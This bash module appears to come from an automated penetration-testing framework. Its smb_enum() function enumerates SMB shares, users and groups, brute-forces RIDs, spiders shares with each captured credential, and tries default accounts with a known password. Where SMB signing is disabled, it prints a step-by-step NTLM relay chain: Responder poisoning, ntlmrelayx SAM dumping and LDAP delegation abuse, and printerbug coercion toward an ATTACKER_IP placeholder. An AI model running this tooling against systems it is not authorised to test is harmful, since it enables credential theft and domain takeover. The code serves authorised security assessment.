#!/bin/bash
# MODULE: smb.sh - smb_enum(): shares, RID brute, spider, signing, post-exploit

smb_enum() {
    CURRENT_PHASE="PHASE6B"

    # Only run authenticated SMB enum if SMB port is actually open
    local _smb_port_open=false
    [[ -s "$OUTDIR/targets_smb.txt" ]] && _smb_port_open=true

    echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  PHASE 6B: SMB ENUMERATION                                ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}\n"

    # If SMB port is closed, skip all authenticated enum and just do signing check
    if [[ "$_smb_port_open" == false ]]; then
        echo -e "${YELLOW}[!] SMB port 445 not open — skipping share/user/spider enumeration${NC}"
        echo -e "${GRAY}    >> sudo nxc smb $TARGET_ARG -u 'USER' -p 'PASS' --shares  # (when SMB opens)${NC}"
        # Still run SMB signing check (useful to know even if port appears closed — may be filtered)
        echo -e "\n${CYAN}[*] SMB Signing check (relay targets)...${NC}"
        # Run against confirmed SMB targets only — avoids slow timeouts on unreachable hosts
        run_cmd "sudo nxc smb $OUTDIR/targets_smb.txt $NXC_WORKERS_FLAG --gen-relay-list '$OUTDIR/relay_targets.txt'" "$OUTDIR/smb_signing.txt"
        return 0
    fi

    # Find SMB-compatible credential (skip DB-only: MYSQL, POSTGRES, REDIS, ORACLE)
    local _smb_first_cred=""
    if [[ -s "$CREDS_FILE" ]]; then
        while IFS='|' read -r _fc_proto _fc_ip _fc_dom _fc_user _fc_sec _fc_pwn _fc_type _fc_ai; do
            case "${_fc_proto^^}" in
                MYSQL|POSTGRES|REDIS|ORACLE|MONGO) continue ;;
            esac
            _smb_first_cred="$_fc_proto|$_fc_ip|$_fc_dom|$_fc_user|$_fc_sec|$_fc_pwn|$_fc_type|$_fc_ai"
            break
        done < "$CREDS_FILE"
    fi

    if [[ -n "$_smb_first_cred" ]]; then
        local proto ip domain user secret pwned cred_type access_info
        IFS='|' read -r proto ip domain user secret pwned cred_type access_info <<< "$_smb_first_cred"
        local AUTH_ARGS
        [[ "$cred_type" == "hash" ]] && AUTH_ARGS="-u '$user' -H '$secret'" || AUTH_ARGS="-u '$user' -p '$secret'"

        echo -e "${CYAN}[*] Shares...${NC}"
        run_cmd "sudo nxc smb $TARGET_ARG $AUTH_ARGS --shares" "$OUTDIR/shares.txt"

        run_cmd "sudo nxc smb $TARGET_ARG $AUTH_ARGS --shares" "$OUTDIR/shares.txt"

        # Quick-access: show smbclient commands for any accessible share found
        if [[ -s "$OUTDIR/shares.txt" ]]; then
            local _readable_shares=()
            local _writable_shares=()
            while IFS= read -r _sl; do
                # Parse share lines: "SMB ip port name ShareName  Permissions  Remark"
                if [[ "$_sl" == SMB* ]] && echo "$_sl" | grep -qiE "READ|WRITE"; then
                    local _sname; _sname=$(echo "$_sl" | awk '{for(i=5;i<=NF;i++){if($i~/^[A-Za-z_][A-Za-z0-9_$]*$/){print $i;exit}}}')
                    # Skip noisy default shares — not useful to browse
                    [[ "$_sname" == "IPC$" || "$_sname" == "ADMIN$" || "$_sname" == "C$" || "$_sname" == "NETLOGON" || "$_sname" == "SYSVOL" ]] && continue
                    if echo "$_sl" | grep -qi "READ,WRITE\|WRITE"; then
                        [[ -n "$_sname" ]] && _writable_shares+=("$_sname")
                    elif echo "$_sl" | grep -qi "READ"; then
                        [[ -n "$_sname" ]] && _readable_shares+=("$_sname")
                    fi
                fi
            done < "$OUTDIR/shares.txt"
            if [[ ${#_readable_shares[@]} -gt 0 || ${#_writable_shares[@]} -gt 0 ]]; then
                echo -e "
${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
                echo -e "${GREEN}║  SHARE ACCESS — QUICK COMMANDS                            ║${NC}"
                echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
                local _smb_ip; _smb_ip=$(echo "$TARGET_ARG" | head -1 | tr -d '
' |                     awk -F'/' '{print $NF}' | awk '{print $1}')
                [[ -f "$TARGET_ARG" ]] && _smb_ip=$(head -1 "$TARGET_ARG" 2>/dev/null)
                for _sh in "${_writable_shares[@]}"; do
                    echo -e "${RED}  READ,WRITE → ${_sh}${NC}"
                    # For share browsing: smbclient.py is interactive (no -c flag).
                    # Use legacy smbclient -c OR nxc smb --shares for scripted enumeration.
                    if [[ -n "$secret" && "$secret" =~ ^[0-9a-fA-F]{32} ]]; then
                        echo -e "${WHITE}  >> smbclient.py '${domain}/${user}@${_smb_ip}' -hashes ':${secret}' -c 'use ${_sh}; ls'  # may need interactive${NC}"
                    else
                        echo -e "${WHITE}  >> smbclient.py '${domain}/${user}:${secret}@${_smb_ip}' -c 'use ${_sh}; ls'  # may need interactive${NC}"
                        echo -e "${GRAY}  >> smbclient //${_smb_ip}/${_sh} -U '${domain}\\${user}' -c 'ls'   # password: ${secret}${NC}"
                    fi
                    echo -e "${WHITE}  >> smbclient //${_smb_ip}/${_sh} -U '${user}' -c 'ls'${NC}"
                    echo -e "${GRAY}  >> mount -t cifs //${_smb_ip}/${_sh} /mnt/smb -o username=${user},password=${secret}${NC}"
                done
                for _sh in "${_readable_shares[@]}"; do
                    echo -e "${ORANGE}  READ      → ${_sh}${NC}"
                    echo -e "${WHITE}  >> impacket-smbclient '${domain}/${user}:${secret}@${_smb_ip}' -c 'use ${_sh}; ls'${NC}"
                    echo -e "${WHITE}  >> smbclient //${_smb_ip}/${_sh} -U '${user}' -c 'ls'${NC}"
                done
            fi
        fi

        echo -e "\n${CYAN}[*] Users...${NC}"
        # Cache --users output globally (slow command; reset when .nxc_ports_cache is deleted)
        local _USERS_CACHE=".nxc_users_cache"
        if [[ -s "$_USERS_CACHE" ]]; then
            echo -e "${GREEN}[+] Using cached user enumeration (delete .nxc_users_cache to force refresh)${NC}"
            cp "$_USERS_CACHE" "$OUTDIR/smb_users.txt"
            cat "$OUTDIR/smb_users.txt"
        else
            run_cmd "sudo nxc smb $TARGET_ARG $AUTH_ARGS --users" "$OUTDIR/smb_users.txt"
            [[ -s "$OUTDIR/smb_users.txt" ]] && cp "$OUTDIR/smb_users.txt" "$_USERS_CACHE"
        fi

        echo -e "\n${CYAN}[*] Groups...${NC}"
        run_cmd "sudo nxc smb $TARGET_ARG $AUTH_ARGS --groups" "$OUTDIR/groups.txt"
        
        if [[ "$SKIP_ENUM" != true ]]; then
            echo -e "\n${CYAN}[*] Authenticated RID brute-force (more effective than anonymous)...${NC}"
            run_cmd "sudo nxc smb $TARGET_ARG $AUTH_ARGS --rid-brute" "$OUTDIR/rid_brute_auth.txt"
            local auth_rid_users=$(grep -oP '\\\K[^\s]+(?=\s+\(SidTypeUser)' "$OUTDIR/rid_brute_auth.txt" 2>/dev/null | sort -u | wc -l)
            [[ $auth_rid_users -gt 0 ]] && echo -e "${GREEN}[+] Found $auth_rid_users users via authenticated RID brute${NC}"
            
            # enum4linux-ng (preferred - supports hashes and has better uitvoer)
            if command -v enum4linux-ng &> /dev/null && [[ -n "$DC_IP" ]]; then
                echo -e "\n${CYAN}[*] enum4linux-ng (comprehensive enumeration)...${NC}"
                if [[ "$cred_type" == "hash" ]]; then
                    run_cmd "enum4linux-ng -A '$DC_IP' -u '$user' -H '$secret' -oJ '$OUTDIR/enum4linux_ng'" "$OUTDIR/enum4linux_ng.txt"
                else
                    run_cmd "enum4linux-ng -A '$DC_IP' -u '$user' -p '$secret' -oJ '$OUTDIR/enum4linux_ng'" "$OUTDIR/enum4linux_ng.txt"
                fi
                # Check for interesting findings
                if grep -qiE "password|credentials|secret" "$OUTDIR/enum4linux_ng.txt" 2>/dev/null; then
                    echo -e "${RED}[!] Potential credentials found in enum4linux-ng output!${NC}"
                fi
            # Terugvaloptie: enum4linux (legacy, no hash support)
            elif command -v enum4linux &> /dev/null && [[ -n "$DC_IP" ]]; then
                echo -e "\n${CYAN}[*] enum4linux -a (comprehensive SMB/RPC enumeration)...${NC}"
                if [[ "$cred_type" == "hash" ]]; then
                    echo -e "${YELLOW}    [!] enum4linux doesn't support hashes, try: pip install enum4linux-ng${NC}"
                else
                    # enum4linux argument order: -u user -p pass [options] doelhost
                    run_cmd "enum4linux -u '$user' -p '$secret' -a '$DC_IP'" "$OUTDIR/enum4linux.txt"
                    # Check for interesting findings
                    if grep -qiE "password|credentials|secret" "$OUTDIR/enum4linux.txt" 2>/dev/null; then
                        echo -e "${RED}[!] Potential credentials found in enum4linux output!${NC}"
                    fi
                fi
            fi
            
            # ldapdomeindump - Comprehensive LDAP domein dump (creates HTML/JSON/grep files)
            if command -v ldapdomaindump &> /dev/null && [[ -n "$DOMAIN" ]] && [[ -n "$DC_IP" ]]; then
                echo -e "\n${CYAN}[*] ldapdomaindump (creates HTML/JSON domain maps)...${NC}"
                mkdir -p "$OUTDIR/ldapdomaindump"
                if [[ "$cred_type" == "hash" ]]; then
                    run_cmd "ldapdomaindump '$DC_IP' -u '$DOMAIN\\$user' -p ':$secret' -o '$OUTDIR/ldapdomaindump' 2>/dev/null"
                else
                    run_cmd "ldapdomaindump '$DC_IP' -u '$DOMAIN\\$user' -p '$secret' -o '$OUTDIR/ldapdomaindump' 2>/dev/null"
                fi
                if [[ -f "$OUTDIR/ldapdomaindump/domain_users.html" ]]; then
                    echo -e "${GREEN}[+] Domain dump created: $OUTDIR/ldapdomaindump/*.html${NC}"
                fi
            fi
        else
            echo -e "${YELLOW}[!] Skipping authenticated RID brute + enum4linux (fast mode)${NC}"
        fi
        
        echo -e "\n${CYAN}[*] SMB Signing check (relay targets)...${NC}"
        # Run against confirmed SMB targets only — avoids slow timeouts on unreachable hosts
        run_cmd "sudo nxc smb $OUTDIR/targets_smb.txt $NXC_WORKERS_FLAG --gen-relay-list '$OUTDIR/relay_targets.txt'" "$OUTDIR/smb_signing.txt"
        if [[ -s "$OUTDIR/relay_targets.txt" ]]; then
            local relay_count=$(wc -l < "$OUTDIR/relay_targets.txt")
            echo -e "${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
            printf "${RED}║  SMB RELAY — %-45s║${NC}\n" "$relay_count target(s) with signing DISABLED"
            echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
            echo -e "${YELLOW}    Relay targets: $OUTDIR/relay_targets.txt${NC}"
            echo -e "${GRAY}  # ── Step 1: Disable SMB+HTTP in Responder (forces relay, stops capture)${NC}"
            echo -e "${GRAY}  >> sudo sed -i 's/SMB = On/SMB = Off/;s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf${NC}"
            echo -e "${GRAY}  # ── Step 2a: Relay → SAM dump (unauthenticated, any signed-off host)${NC}"
            echo -e "${GRAY}  >> sudo impacket-ntlmrelayx -tf '$OUTDIR/relay_targets.txt' -smb2support${NC}"
            echo -e "${GRAY}  # ── Step 2b: Relay → LDAP for shadow creds / RBCD / DA (needs LDAPS)${NC}"
            echo -e "${GRAY}  >> sudo impacket-ntlmrelayx -t ldaps://${DC_IP:-DC_IP} -smb2support --delegate-access${NC}"
            echo -e "${GRAY}  # ── Step 3: Start Responder (LLMNR/NBT-NS poisoning triggers auth)${NC}"
            echo -e "${GRAY}  >> sudo responder -I IFACE -dwv${NC}"
            echo -e "${GRAY}  # ── OR: coerce a specific host instead of waiting for Responder:${NC}"
            echo -e "${GRAY}  >> python3 printerbug.py '${DOMAIN:-DOMAIN}/${user:-USER}:${secret:-PASS}@TARGET_IP' ATTACKER_IP${NC}"
            echo -e "${GRAY}  >> impacket-rpcdump TARGET_IP | grep -i print  # check print spooler first${NC}"
        fi

        if [[ "$SKIP_ENUM" != true ]]; then
            echo -e "\n${CYAN}[*] Logged-on users...${NC}"
            run_cmd "sudo nxc smb $TARGET_ARG $AUTH_ARGS --loggedon-users" "$OUTDIR/loggedon.txt"
        else
            echo -e "${GRAY}[*] Logged-on users skipped (fast mode — run manually: nxc smb $TARGET_ARG $AUTH_ARGS --loggedon-users)${NC}"
        fi

        # Spider shares with EACH unique credential (different gebruikers may have different access)
        echo -e "\n${CYAN}[*] Spider shares (60s timeout per credential)...${NC}"
        echo -e "${YELLOW}[!] Note: NXC may show DOWNLOAD_FLAG:True but it respects the false setting${NC}"
        echo -e "${YELLOW}[!] NXC spider_plus has a known bug showing 'Reconnection attempt #1/5' repeatedly${NC}"
        
        local seen_creds=""
        local spider_count=0
        local total_creds=$(wc -l < "$CREDS_FILE" 2>/dev/null || echo 1)
        
        while IFS='|' read -r s_proto s_ip s_domain s_user s_secret s_pwned s_cred_type s_access_info; do
            # Create unique key for this credential
            local cred_key="$s_user|$s_secret"
            
            # Sla over if we've already tried this credential
            [[ "$seen_creds" == *"$cred_key"* ]] && continue
            seen_creds="$seen_creds|$cred_key"
            ((spider_count++))
            
            local SPIDER_AUTH
            if [[ "$s_cred_type" == "hash" ]]; then
                SPIDER_AUTH="-u '$s_user' -H '$s_secret'"
            else
                SPIDER_AUTH="-u '$s_user' -p '$s_secret'"
            fi
            
            echo -e "${WHITE}# [$spider_count] Spidering as: $s_user${NC}"
    queue_phase_cmd "sudo nxc smb $TARGET_ARG $SPIDER_AUTH -M spider_plus -o DOWNLOAD_FLAG=false READ_ONLY=true"
            # Filter out repetitive reverbinding attempts to reduce noise
            while IFS= read -r _sline || [[ -n "$_sline" ]]; do
                [[ "$_sline" =~ "Reconnection attempt #" ]] && continue
                render_cmd_line "$_sline" "$OUTDIR/spider_${s_user}.txt"
            done < <(timeout 60 bash -c "sudo nxc smb $TARGET_ARG $SPIDER_AUTH -M spider_plus -o DOWNLOAD_FLAG=false READ_ONLY=true 2>&1") || {
                echo -e "${YELLOW}[!] Spider timed out for $s_user - continuing...${NC}"
            }
            echo -e "${GREEN}[+] Finished spidering as $s_user${NC}"

            # If --shares timed out (shares.txt empty), extract share list from spider output
            if [[ ! -s "$OUTDIR/shares.txt" ]] && [[ -s "$OUTDIR/spider_${s_user}.txt" ]]; then
                local _spider_writable=() _spider_readable=()
                while IFS= read -r _spline; do
                    [[ "$_spline" != SMB* ]] && continue
                    echo "$_spline" | grep -qiE "READ|WRITE" || continue
                    local _spname; _spname=$(echo "$_spline" | awk '{for(i=5;i<=NF;i++){if($i~/^[A-Za-z_][A-Za-z0-9_$]*$/){print $i;exit}}}')
                    [[ "$_spname" == "IPC$" || "$_spname" == "ADMIN$" || "$_spname" == "C$" || "$_spname" == "NETLOGON" || "$_spname" == "SYSVOL" ]] && continue
                    if echo "$_spline" | grep -qi "READ,WRITE\|WRITE"; then
                        [[ -n "$_spname" ]] && _spider_writable+=("$_spname")
                    elif echo "$_spline" | grep -qi "READ"; then
                        [[ -n "$_spname" ]] && _spider_readable+=("$_spname")
                    fi
                done < "$OUTDIR/spider_${s_user}.txt"

                if [[ ${#_spider_writable[@]} -gt 0 || ${#_spider_readable[@]} -gt 0 ]]; then
                    local _sp_ip
                    _sp_ip=$(head -1 "$OUTDIR/targets_smb.txt" 2>/dev/null || \
                             head -1 "$TARGET_ARG"             2>/dev/null || echo "$TARGET_IP")
                    echo -e "
${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
                    echo -e "${GREEN}║  SHARE ACCESS — QUICK COMMANDS (from spider)              ║${NC}"
                    echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
                    for _sh in "${_spider_writable[@]}"; do
                        echo -e "${RED}  READ,WRITE → ${_sh}${NC}"
                        echo -e "${WHITE}  >> impacket-smbclient '${s_domain:-$DOMAIN}/${s_user}:${s_secret}@${_sp_ip}' -c 'use ${_sh}; ls'${NC}"
                        echo -e "${WHITE}  >> smbclient //${_sp_ip}/${_sh} -U '${s_user}' -c 'ls'${NC}"
                        echo -e "${GRAY}  >> mount -t cifs //${_sp_ip}/${_sh} /mnt/smb -o username=${s_user},password=${s_secret}${NC}"
                    done
                    for _sh in "${_spider_readable[@]}"; do
                        echo -e "${ORANGE}  READ      → ${_sh}${NC}"
                        echo -e "${WHITE}  >> impacket-smbclient '${s_domain:-$DOMAIN}/${s_user}:${s_secret}@${_sp_ip}' -c 'use ${_sh}; ls'${NC}"
                        echo -e "${WHITE}  >> smbclient //${_sp_ip}/${_sh} -U '${s_user}' -c 'ls'${NC}"
                    done
                fi
            fi
        done < "$CREDS_FILE"

        # Post-exploit dump commands are shown in the final READY-TO-USE COMMANDS block (summary.sh)
    else
        echo -e "${YELLOW}[!] No confirmed SMB credentials — trying anonymous/guest/default access...${NC}"
        
        # Try share enumeration with anonymous accounts
        echo -e "${CYAN}[*] SMB - Share enumeration (anonymous/guest)...${NC}"
        run_cmd "sudo nxc smb $TARGET_ARG -u '' -p '' --shares" "$OUTDIR/smb_shares_null.txt"
        run_cmd "sudo nxc smb $TARGET_ARG -u 'guest' -p '' --shares" "$OUTDIR/smb_shares_guest.txt"
        # If we have a password but no confirmed user, try with common accounts
        if [[ "$HAS_PASSWORDS" == true && -n "$PASSWORDS" && -s "$PASSWORDS" ]]; then
            local _fb_pass; _fb_pass=$(head -1 "$PASSWORDS")
            echo -e "${CYAN}[*] Have password — trying with common Windows accounts...${NC}"
            for _fb_user in administrator admin user backup guest; do
                local _fb_tmp="$OUTDIR/smb_shares_${_fb_user}.txt"
                run_cmd "sudo nxc smb $TARGET_ARG -u '$_fb_user' -p '$_fb_pass' --shares" "$_fb_tmp"
                if grep -q "\[+\]" "$_fb_tmp" 2>/dev/null; then
                    echo -e "${GREEN}[+] SMB access with ${_fb_user}:${_fb_pass}${NC}"
                    grep -qF "SMB|$TARGET_ARG||${_fb_user}|${_fb_pass}" "$CREDS_FILE" 2>/dev/null || \
                        echo "SMB|$TARGET_ARG||${_fb_user}|${_fb_pass}|no|password|" >> "$CREDS_FILE"
                    break
                fi
            done
            # Also try local-auth
            run_cmd "sudo nxc smb $TARGET_ARG --local-auth -u 'administrator' -p '$_fb_pass' --shares" "$OUTDIR/smb_shares_admin_local.txt"
        fi
        run_cmd "sudo nxc smb $TARGET_ARG -u 'anonymous' -p '' --shares" "$OUTDIR/smb_shares_anon.txt"
        
        # Consolidate and display share results
        cat "$OUTDIR"/smb_shares_*.txt 2>/dev/null | grep -v "Error\|^\s*$" | sort -u > "$OUTDIR/anon_shares.txt"
        
        local first_target
        # Use first confirmed-open SMB target (not blind head of targets.txt which may be unreachable)
        first_target=$(head -1 "$OUTDIR/targets_smb.txt" 2>/dev/null || \
                       head -1 "$TARGET_ARG"             2>/dev/null || echo "$TARGET_ARG")
        
        # Use impacket-smbclient FIRST (betrouwbaarder than smbclient!)
        if command -v impacket-smbclient &>/dev/null || command -v smbclient.py &>/dev/null; then
            echo -e "${CYAN}[*] impacket-smbclient (more reliable)...${NC}"
            local IMPACKET_SMB=$(command -v impacket-smbclient || command -v smbclient.py)
            
    queue_phase_cmd "$IMPACKET_SMB ''/'anonymous'@$first_target -no-pass -c 'shares'"
            $IMPACKET_SMB ''/'anonymous'@"$first_target" -no-pass -c 'shares' 2>/dev/null | tee "$OUTDIR/shares_impacket.txt"
            
            # Also try with null
    queue_phase_cmd "$IMPACKET_SMB ''/''@$first_target -no-pass -c 'shares'"
            $IMPACKET_SMB ''/''@"$first_target" -no-pass -c 'shares' 2>/dev/null | tee -a "$OUTDIR/shares_impacket.txt"
            
            # Parse shares from impacket uitvoer
            if [[ -s "$OUTDIR/shares_impacket.txt" ]]; then
                echo -e "\n${GREEN}[+] SHARES FOUND (impacket-smbclient):${NC}"
                grep -E "^[A-Za-z]" "$OUTDIR/shares_impacket.txt" 2>/dev/null | grep -v "^Impacket\|^Type\|^#" | while read -r line; do
                    local share=$(echo "$line" | awk '{print $1}')
                    echo -e "    ${CYAN}$share${NC}"
                done
                
                # Save share names
                grep -E "^[A-Za-z]" "$OUTDIR/shares_impacket.txt" | grep -v "^Impacket\|^Type\|^#" | awk '{print $1}' | sort -u > "$OUTDIR/share_names.txt"
            fi
        fi
        
        # Regular smbclient as terugvaloptie
        if command -v smbclient &>/dev/null; then
            echo -e "${CYAN}[*] smbclient fallback for share listing...${NC}"
            
    queue_phase_cmd "smbclient -L //$first_target -U '' -N"
            smbclient -L "//$first_target" -U '' -N 2>/dev/null | tee "$OUTDIR/smbclient_shares.txt"
            
            # Parse and display shares
            if [[ -s "$OUTDIR/smbclient_shares.txt" ]]; then
                echo -e "\n${GREEN}[+] SHARES FOUND (smbclient):${NC}"
                grep -E "^\s+\S+\s+(Disk|IPC)" "$OUTDIR/smbclient_shares.txt" | while read -r line; do
                    local share=$(echo "$line" | awk '{print $1}')
                    local type=$(echo "$line" | awk '{print $2}')
                    echo -e "    ${CYAN}$share${NC} ($type)"
                done
                
                # Append to share_names.txt
                grep -E "^\s+\S+\s+Disk" "$OUTDIR/smbclient_shares.txt" | awk '{print $1}' >> "$OUTDIR/share_names.txt" 2>/dev/null
                sort -u "$OUTDIR/share_names.txt" -o "$OUTDIR/share_names.txt" 2>/dev/null
                
                # Try to access each non-standaard share
                echo -e "\n${CYAN}[*] Testing share access...${NC}"
                for share in $(grep -E "^\s+\S+\s+Disk" "$OUTDIR/smbclient_shares.txt" | awk '{print $1}' | grep -Ev '^(ADMIN\$|C\$|IPC\$|NETLOGON|SYSVOL)$'); do
    queue_phase_cmd "smbclient //$first_target/$share -U '' -N -c 'ls'"
                    local access_result=$(smbclient "//$first_target/$share" -U '' -N -c 'ls' 2>&1)
                    if echo "$access_result" | grep -qv "NT_STATUS"; then
                        echo -e "${GREEN}[+] READ ACCESS: $share${NC}"
                        echo "$access_result" | head -10
                    else
                        echo -e "${RED}[-] NO ACCESS: $share${NC}"
                    fi
                done
            fi
        fi

        # ── AUTO-BROWSE READABLE SHARES (Phase 6B / no creds path) ────────────
        # smb_enum() writes to smb_shares_*.txt - parse those for READ access
        # and immediately browse with smbclient.py so we see share contents.
        local _se_readable=()
        local _se_user="" _se_target=""
        for _sf3 in "$OUTDIR/smb_shares_anon.txt" "$OUTDIR/smb_shares_guest.txt" "$OUTDIR/smb_shares_null.txt"; do
            [[ -s "$_sf3" ]] || continue
            if   [[ "$_sf3" == *anon*  ]]; then _try3="anonymous"
            elif [[ "$_sf3" == *guest* ]]; then _try3="guest"
            else _try3=""; fi
            while IFS= read -r _l3; do
                echo "$_l3" | grep -qE '[[:space:]]READ([,[:space:]]|$)' || continue
                local _s3
                _s3=$(echo "$_l3" | awk '{print $5}')
                [[ "$_s3" =~ ^(IPC\$|ADMIN\$|C\$|PRINT\$)$ ]] && continue
                [[ -z "$_s3" ]] && continue
                local _dup3=false
                for _e3 in "${_se_readable[@]}"; do [[ "$_e3" == "$_s3" ]] && _dup3=true && break; done
                if [[ "$_dup3" == false ]]; then
                    _se_readable+=("$_s3")
                    [[ -z "$_se_user"   ]] && _se_user="$_try3"
                    [[ -z "$_se_target" ]] && _se_target=$(head -1 "$OUTDIR/targets_smb.txt" 2>/dev/null || echo "$TARGET_IP")
                fi
            done < "$_sf3"
        done

        if [[ ${#_se_readable[@]} -gt 0 ]]; then
            echo -e "
${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
            echo -e "${GREEN}║  READABLE SHARES (anonymous) - AUTO BROWSING              ║${NC}"
            echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
            echo -e "${GREEN}[+] Readable share(s): ${_se_readable[*]}  (user: ${_se_user:-null})${NC}"

            local _ISMB3
            _ISMB3=$(command -v impacket-smbclient 2>/dev/null || command -v smbclient.py 2>/dev/null || echo "")

            if [[ -z "$_ISMB3" ]]; then
                echo -e "${YELLOW}[!] impacket-smbclient not found - showing commands only${NC}"
                for _s3 in "${_se_readable[@]}"; do
                    show_cmd "impacket-smbclient ''/'${_se_user}'@${_se_target} -no-pass -c 'use ${_s3}; ls'"
                    show_cmd "impacket-smbclient ''/'${_se_user}'@${_se_target} -no-pass -c 'use ${_s3}; tree'"
                done
            else
                for _s3 in "${_se_readable[@]}"; do
                    echo -e "
${CYAN}[*] Share: ${YELLOW}${_s3}${CYAN}  (${_se_user:-null}@${_se_target})${NC}"
                    show_cmd "$_ISMB3 ''/'${_se_user}'@${_se_target} -no-pass -c 'use ${_s3}; ls'"
                    "$_ISMB3" ''/"${_se_user}"@"${_se_target}" -no-pass \
                        -c "use ${_s3}; ls" 2>/dev/null \
                        | tee "$OUTDIR/share_ls_anon_${_s3}.txt"
                    echo -e "${CYAN}    [tree - recursive listing]${NC}"
                    show_cmd "$_ISMB3 ''/'${_se_user}'@${_se_target} -no-pass -c 'use ${_s3}; tree'"
                    "$_ISMB3" ''/"${_se_user}"@"${_se_target}" -no-pass \
                        -c "use ${_s3}; tree" 2>/dev/null \
                        | tee "$OUTDIR/share_tree_anon_${_s3}.txt"
                    local _fc3=0
                    _fc3=$(grep -ciE '\.(exe|dll|zip|ps1|bat|cmd|conf|config|ini|xml|txt|pdf|docx?|xlsx?|key|pem|pfx|crt|bak|old|sql|db|json|yaml|yml)$'                         "$OUTDIR/share_tree_anon_${_s3}.txt" 2>/dev/null || echo 0)
                    [[ "$_fc3" -gt 0 ]] && echo -e "${YELLOW}[!] ${_fc3} interesting file(s) in ${_s3} → share_tree_anon_${_s3}.txt${NC}"
                    queue_phase_cmd "# === READABLE SHARE: ${_s3} (${_se_user:-null}@${_se_target}) ==="
                    queue_phase_cmd "$_ISMB3 ''/'${_se_user}'@${_se_target} -no-pass"
                done
            fi
        fi
        # ─────────────────────────────────────────────────────────────────────
    fi
}
